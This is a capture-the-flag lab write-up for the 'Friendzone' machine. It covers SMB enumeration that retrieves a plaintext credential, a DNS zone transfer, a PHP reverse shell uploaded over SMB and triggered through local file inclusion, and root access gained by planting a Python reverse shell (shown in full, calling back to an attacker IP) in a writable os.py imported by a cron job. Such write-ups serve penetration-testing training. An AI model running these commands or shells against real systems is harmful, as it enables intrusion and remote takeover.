# Friendzone

nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 20:30 GMT
Nmap scan report for 10.129.38.45
Host is up (0.023s latency).
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2026-01-11T22:31:15+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-01-11T20:31:16
|_  start_date: N/A
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.88 seconds
```

Interesting thing:
Port 80
Port 53
Port 443 domain: `friendzone.red`
Samba is in used

Nth interesting in port 80

Samba

```bash
# Use smbmap to find any accessible disk (-r: show files)
smbmap -H 10.129.38.45 -r

[+] IP: 10.129.38.45:445        Name: friendzone.red            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))

# Use smbclient to read the file
smbclient //10.129.38.45/general -c 'get creds.txt'

# Got cred admin:WORKWORKHhallelujah@#
```

dig [`friendzone.red`](http://friendzone.red) for subdomains (refreshed ip: 10.129.39.110)

```bash
dig axfr @10.129.39.110 friendzone.red
```

Found administrator1.friendzone.red

Used the credentials to login

Found the param `pagename` is vulnerable as it will run the php file (tried with `dashboard`)

So now the idea would be uploading a php reverse shell code and use LFI to run it

We downloaded the reverse shell from https://pentestmonkey.net/tools/web-shells/php-reverse-shell and uploaded it to Development

```bash
# Use smbclient to upload file
smbclient //10.129.38.45/Development -c 'put php-reverse-shell.php'
```

```bash
# The browser this url to trigger the shell
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

PrivEsc

Tried [`linpeas.sh`](http://linpeas.sh) but nothing interesting found

Tried `pspy.sh` and found a cron job (`reporter.py`) running as root for every short period

Used [`lse.sh`](http://lse.sh) and found that [`os.py`](http://os.py) is owned by me, and it is imported in `report.py` , which means we can hijack the file and put a python reverse shell in it.

```bash
# Here is the reverse shell that I used
# As we are writing in os.py, every "os" before dup has to be deleted
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.15.151",5555));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

source: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Finished the lab!!!